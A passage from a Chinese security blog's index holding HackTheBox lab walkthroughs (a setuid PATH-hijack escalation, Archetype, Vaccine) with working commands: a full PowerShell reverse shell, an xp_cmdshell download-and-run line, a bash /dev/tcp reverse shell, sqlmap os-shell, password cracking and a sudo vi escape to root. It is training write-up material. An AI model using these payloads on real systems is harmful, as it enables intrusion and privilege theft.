src="https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png"></p><p>然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里</p><p><strong>访问上传的shell来执行</strong></p><p><img src="https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png"></p><p>回到netcat中就可以看到反弹的shell了</p><p><img src="https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png"></p><p>拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码</p><p><img src="https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png"></p><p>但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交互式模式就是<span class="built_in">shell</span>等待你的输入，并且立即执行你提交的命令，退出后才终止</span><br><span class="line">非交互式模式就是以<span class="built_in">shell</span> script方式执行，<span class="built_in">shell</span>不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止</span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用netcat获得的<span class="keyword">shell</span>是非交互式的，不能传递<span class="keyword">tab</span>来进行补全，不能使用<span class="keyword">su</span>、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p>逐条键入命令：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 将在环境变量下将shell设置为<span class="regexp">/bin/</span>bash且参数为-q和<span class="regexp">/dev/</span><span class="keyword">null</span>的情况下运行脚本，-q参数为静默运行，输出到<span class="regexp">/dev/</span><span class="keyword">null</span>里，如果不加script -q <span class="regexp">/dev/</span><span class="keyword">null</span>不会新启一个bash，shell=<span class="regexp">/bin/</span>bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">SHELL=<span class="regexp">/bin/</span>bash script -q <span class="regexp">/dev/</span><span class="keyword">null</span></span><br><span class="line"># 将netcat暂挂至后台</span><br><span class="line">Ctrl-Z</span><br><span class="line"># 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">stty raw -echo</span><br><span class="line"># 将netcat返回到前台，注意：这里不会显示输入的命令</span><br><span class="line">fg</span><br><span class="line"># 重置远程终端，经测试也可以不进行此操作</span><br><span class="line">reset</span><br><span class="line"># 运行xterm</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure><p>拿到交互的shell我们就可以切换到Robert用户了</p><p><img src="https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png"></p><p><strong>获取普通用户权限的flag</strong></p><p><img src="https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># -type f 为查找普通文档，-<span class="keyword">group</span> bugtracker 限定查找的组为bugtracker，<span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="keyword">null</span> 将错误输出到黑洞（不显示）</span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/ -type f -group bugtracker 2&gt;/</span>dev/<span class="keyword">null</span> </span><br><span class="line"># -al 以长格式方式显示并且显示隐藏文件</span><br><span class="line">ls -al <span class="regexp">/usr/</span>bin/bugtracker           </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png"></p><p><img src="https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png"></p><p>拥有者有<code>s</code>（<code>setuid</code>）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的<code>ID</code>值输出以该数字为编号的<code>bug</code>报告</p><p><img src="https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png"></p><p>接下来我们可以使用<code>strings</code>命令来看看对象文件或二进制文件中查找可打印的字符串</p><p><img src="https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png"></p><p>可以看到<code>bugtracker</code>调用了<code>cat</code>命令，输出了<code>/root/reports/</code>目录下的<code>bug</code>报告，其实本来我们当前用户是没有权限访问<code>/root</code>目录的，但是我们有了<code>setuid</code>后就拥有了<code>/root</code>目录的访问有权限，也就拥有了<code>root</code>权限，当前用户执行<code>bugtracker</code>程序是会优先使用当前的<code>path</code>变量，这时候我们就可以在当前用户环境变量<code>指定的路径</code>中搜索<code>cat</code>命令，然后创建一个恶意的<code>cat</code>命令，修改当前用户环境变量，完成提权操作</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export PATH=<span class="regexp">/tmp:$PATH                /</span><span class="regexp">/将/</span>tmp目录设置为环境变量</span><br><span class="line">cd <span class="regexp">/tmp/</span>                            <span class="regexp">//</span>切换到/tmp目录下</span><br><span class="line">echo <span class="string">&#x27;/bin/sh&#x27;</span> &gt; cat                <span class="regexp">//</span>在此构造恶意的cat命令</span><br><span class="line">chmod +x cat                        <span class="regexp">//</span>赋予执行权限</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png"></p><p>这样<code>bugtracker</code>再次调用<code>cat</code>命令时实际上调用的是<code>/tmp</code>目录下的恶意的<code>cat</code>命令，我们运行一下<code>bugtracker</code>可以看出，此时<code>robert</code>用户临时具有了<code>root</code>权限，执行<code>id</code>命令发现只是<code>robert</code>用户的<code>uid</code>变为了<code>root</code>，不是真正的<code>root</code>用户</p><p><img src="https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png"></p><p>这样我们就可以获取system的flag了</p><p><img src="https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png"></p><p>在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码</p><p><img src="https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png"></p><blockquote><p>参考：</p><p>1、<a href="https://www.echocipher.life/index.php/archives/872/">https://www.echocipher.life/index.php/archives/872/</a></p><p>2、<a href="https://www.cnblogs.com/qlqwjy/p/8665871.html">关于Linux下s、t、i、a权限</a></p><p>3、<a href="http://www.361way.com/suid-privilege/5965.html">LINUX s权限位提权</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Archetype</title>
      <link href="/2021/07/13/HackTheBox-Archetype/"/>
      <url>/2021/07/13/HackTheBox-Archetype/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png"></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描："><a href="#nmap扫描：" class="headerlink" title="nmap扫描："></a>nmap扫描：</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV <span class="number">10.10.10.27</span></span><br></pre></td></tr></table></figure><p>-sC：使用默认脚本进行扫描，等同于–script=default<br>-sV：探测开启的端口来获取服务、版本信息</p><p><img src="https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png"></p><p>可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口</p><h4 id="445端口匿名访问"><a href="#445端口匿名访问" class="headerlink" title="445端口匿名访问"></a>445端口匿名访问</h4><p>测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L <span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.27</span>/</span><br></pre></td></tr></table></figure><p>-N：匿名登录<br>-L：获取共享资源列表</p><p><img src="https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png"></p><p>可以看到存在一个backups目录，使用smbclient来访问：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N <span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.27</span>/backups</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png"></p><p>发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：</p><p><img src="https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png"></p><h3 id="impacket工具的使用"><a href="#impacket工具的使用" class="headerlink" title="impacket工具的使用"></a>impacket工具的使用</h3><blockquote><p>下载地址：<a href="https://github.com/SecureAuthCorp/impacket/tree/master">https://github.com/SecureAuthCorp/impacket/tree/master</a></p></blockquote><p><strong>安装</strong>：</p><p>进入impacket目录，执行：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> .</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png"></p><p>用前面获得的账号和密码登录：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py <span class="symbol">sql_svc@</span><span class="number">10.10</span><span class="number">.10</span><span class="number">.27</span> -windows-auth</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png"></p><p>判断当前是否拥有sysadmin权限：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">SELECT</span> <span class="function"><span class="title">IS_SRVROLEMEMBER</span>(<span class="string">&#x27;sysadmin&#x27;</span>)</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png"></p><p>返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行</p><h3 id="使用数据库调用系统命令"><a href="#使用数据库调用系统命令" class="headerlink" title="使用数据库调用系统命令"></a>使用数据库调用系统命令</h3><p>依次写入：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure <span class="string">&#x27;Show Advanced Options&#x27;</span>, <span class="number">1</span>;<span class="string">\\使用sp_configure系统存储过程，设置服务器配置选项，将Show</span> Advanced Options设置为<span class="number">1</span>时，允许修改数据库的高级配置选项</span><br><span class="line">reconfigure;<span class="string">\\确认上面的操作</span></span><br><span class="line">sp_configure;<span class="string">\\查看当前sp_configure配置情况</span></span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span><span class="string">\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL</span> Server调用操作系统命令</span><br><span class="line">reconfigure;<span class="string">\\确认上面的操作</span></span><br><span class="line">xp_cmdshell <span class="string">&quot;whoami&quot;</span> <span class="string">\\在靶机上调用cmdshell执行whoami</span></span><br></pre></td></tr></table></figure><p>执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\sql_svc</p><p><img src="https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png"></p><h3 id="获得操作系统普通用户权限"><a href="#获得操作系统普通用户权限" class="headerlink" title="获得操作系统普通用户权限"></a>获得操作系统普通用户权限</h3><p>我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；</p><p>在桌面新建一个powershell的反弹shell文件shell.ps1（<strong>注意将其中的ip修改为HTB分配的ip</strong>）</p><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="keyword">New</span>-<span class="keyword">Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.14.55&quot;</span>,<span class="number">443</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = <span class="number">0</span>.<span class="number">.65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="keyword">New</span>-<span class="keyword">Object</span> -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-<span class="keyword">String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；</p><p>因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png"></p><p>然后开启一个监听端口，用来接收反弹的shell：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">443</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png"></p><p>接着在数据库shell中执行如下命令，反弹shell：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (<span class="built_in">New</span>-<span class="keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.55/shell.ps1\&quot;);&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png"></p><h3 id="获取普通用户权限的flag"><a href="#获取普通用户权限的flag" class="headerlink" title="获取普通用户权限的flag"></a>获取普通用户权限的flag</h3><p>在nc接收的shell中直接执行下面的命令：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>ql_svc<span class="symbol">\D</span>esktop<span class="symbol">\u</span>ser.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png"></p><h3 id="获取系统权限用户的flag"><a href="#获取系统权限用户的flag" class="headerlink" title="获取系统权限用户的flag"></a>获取系统权限用户的flag</h3><p>使用下面的命令来访问PowerShell历史记录文件：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>ql_svc<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\P</span>owerShell<span class="symbol">\P</span>SReadline<span class="symbol">\C</span>onsoleHost_history.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png"></p><p>发现administrator用户登录后将共享文件夹\Archetype\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py <span class="symbol">administrator@</span><span class="number">10.10</span><span class="number">.10</span><span class="number">.27</span></span><br></pre></td></tr></table></figure><p>输入上面获得的密码就可以成功提权</p><p><img src="https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png"></p><p>执行如下命令获得flag：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:<span class="symbol">\U</span>sers<span class="symbol">\A</span>dministrator<span class="symbol">\D</span>esktop<span class="symbol">\r</span>oot.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png"></p><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/qq_45951598/article/details/115269502">https://blog.csdn.net/qq_45951598/article/details/115269502</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Vaccine</title>
      <link href="/2021/07/13/HackTheBox-Vaccine/"/>
      <url>/2021/07/13/HackTheBox-Vaccine/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png" alt="Screenshot_2021-08-04_09_35_14"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描：</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV <span class="number">10.10.10.46</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png" alt="Screenshot_2021-08-02_11_35_34"></p><p>看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码</p><p><img src="https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png" alt="Screenshot_2021-08-02_11_38_54"></p><p>因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ftpuser</span>/mc@F<span class="number">1</span>l<span class="number">3</span>ZilL<span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png" alt="Screenshot_2021-08-02_11_40_03"></p><p>直接输入上一题中获得的用户名和密码可以成功登录</p><p><img src="https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png" alt="Screenshot_2021-08-02_11_40_34"></p><p>可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码</p><p><img src="https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png" alt="Screenshot_2021-08-02_11_40_55"></p><p>我们直接使用john来爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip2john backup.<span class="built_in">zip</span> &gt; <span class="built_in">hash</span></span><br><span class="line">john <span class="built_in">hash</span></span><br><span class="line"><span class="comment">#因为我已经爆破过一次，所以可以直接show输出</span></span><br><span class="line">john <span class="built_in">hash</span> --show</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png" alt="Screenshot_2021-08-02_11_47_56"></p><p>得到压缩包密码<code>7418529630</code>，解压后有<code>index.php</code>，从代码中可以看到用户名和md5加密的密码</p><p><img src="https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png" alt="Screenshot_2021-08-02_11_48_29"></p><p>将md5加密的密码到在线的md5解密网站解密，得到密码为<code>qwerty789</code></p><p><img src="https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png" alt="Screenshot_2021-08-02_11_49_39"></p><p>回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下</p><p><img src="https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png" alt="Screenshot_2021-08-02_14_15_39"></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入</p><p><img src="https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png" alt="Screenshot_2021-08-02_14_15_53"></p><p>那就直接用sqlmap跑，注意cookie要改成自己的值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http:<span class="string">//10.10.10.46/dashboard.php</span>?search=a <span class="params">--cookie=</span><span class="string">&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png" alt="Screenshot_2021-08-03_09_22_43"></p><p><img src="https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png" alt="Screenshot_2021-08-03_09_26_33"></p><p>可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http:<span class="string">//10.10.10.46/dashboard.php</span>?search=a <span class="params">--cookie=</span><span class="string">&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;</span> <span class="params">--os-shell</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png" alt="Screenshot_2021-08-03_09_27_03"></p><p>接下来反弹shell，开启一个监听端口</p><p><img src="https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png" alt="Screenshot_2021-08-03_09_27_50"></p><p>在sqlmap的shell中输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="number">10.10.15.60</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png" alt="Screenshot_2021-08-03_09_28_01"></p><p>成功接收到反弹的shell</p><p><img src="https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png" alt="Screenshot_2021-08-03_09_28_19"></p><p><img src="https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png" alt="Screenshot_2021-08-03_09_29_41"></p><p>先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码</p><p><img src="https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png" alt="Screenshot_2021-08-03_09_31_35"></p><p>接下来先得到交互式的shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#看别的walkthrough说是两个都可以，但是我用第一个不行</span></span><br><span class="line">SHELL=<span class="regexp">/bin/</span>bash script -q <span class="regexp">/dev/</span>null</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p>得到交互式的shell后，可以通过<code>sudo -l</code>命令查看当前用户的权限，用户被允许编辑配置文件<code>/etc/postgresql/11/main/pg_hba.conf</code>，可以利用<code>vi</code>并验证密码提权至<code>root</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/vi /etc/postgresql/<span class="number">11</span>/main/pg_hba.conf</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png" alt="Screenshot_2021-08-03_09_33_34"></p><p><img src="https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png" alt="Screenshot_2021-08-03_09_34_36"></p><p>输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得<code>root</code>权限</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!<span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png" alt="Screenshot_2021-08-03_09_35_30"></p><p>最后就可以读取root的flag了</p><p><img src="https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png" alt="Screenshot_2021-08-03_09_36_08"></p><blockquote><p>参考：</p><p><a href="https://www.echocipher.life/index.php/archives/891/">https://www.echocipher.life/index.php/archives/891/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
